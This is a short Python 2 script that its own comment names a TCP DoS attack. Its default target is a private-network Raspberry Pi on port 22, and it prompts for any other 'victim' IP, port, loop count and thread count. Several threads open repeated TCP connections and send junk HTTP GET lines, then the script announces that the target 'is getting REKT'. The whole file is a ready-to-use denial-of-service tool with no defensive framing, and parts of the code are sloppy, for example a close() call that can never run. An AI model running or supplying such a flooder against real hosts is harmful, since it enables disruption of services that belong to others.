import time, socket, os, sys, string, getopt, threading

# TCP DoS attack created by James Solum 

############ MAIN ################
def main():
	global message, host, port, attack, threads
	message = "I like Blueberries Better"
	host = "10.22.3.127"
	port = 22
	attack = 50
	threads = dict()
	numOThr = 10
	answer = 0 
	
	#Run Program
	while(answer == 0):
		dfaultAsk = str(raw_input("Default attack against RaspPi? (yes/no/info) "))
		if dfaultAsk == "yes" or dfaultAsk == "y" or dfaultAsk == "Y":
			answer = 1
		elif dfaultAsk == "i" or dfaultAsk == "I" or dfaultAsk == "info" or dfaultAsk == "Info":
			print("\nDefault Attack")
			print("Host: %s" % host)
			print("Port: %d" % port)
			print("Attack Size: %d" % attack)
			print("Message: %s" % message)
			print("Thread count: %d\n" % numOThr)
		elif dfaultAsk == "no" or dfaultAsk == "n" or dfaultAsk == "N":
			host = str(raw_input("Input Victim's IP: "))
			port = input("Input Victim's Port: ")
			attack = input("Loop count: ")
			message = str(raw_input("Attack message: "))
			numOThr = input("Number of Threads: ")
			answer = 1
		elif dfaultAsk == "q" or dfaultAsk == "quit":
			quit()
		else:
			print("Invalid Input")

	#Preprare Threads
	for x in range(1, numOThr):
		threads[x] = myThread()

	#Start Attack
	startAttack(host, port, message, numOThr)

########### HELPER FUNCTIONS ###########
# Creates Packets to Send
def dos(host, port, message):
	dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		dos.connect((host, port))
		dos.send("GET /%s HTTP/1.1\r\n" % message)
		dos.sendto("GET /%s HTTP/1.1\r\n" % message, (host, port))
		dos.send("GET /%s HTTP/1.1\r\n" % message)
		return True
	except socket.error, msg:
		print("Failed Packet")
		sys.stdout.write("\033[F")
		return False
		dos.close()

#Sets up threads
class myThread (threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)
	def run(self):
		for x in range(0, attack):
			dos(host, port, message)
	def stop(self):
		self._Thread_stop()

#Start Attack
def startAttack(host, port, message, numOThr):
	if dos(host, port, message) == True:
		print("\n%s is getting REKT" % host)
		for x in range(1, numOThr):
			threads[x].start()
	else:
		print("Connection Failed")
		

## RUN!
if __name__ == "__main__": 
	main()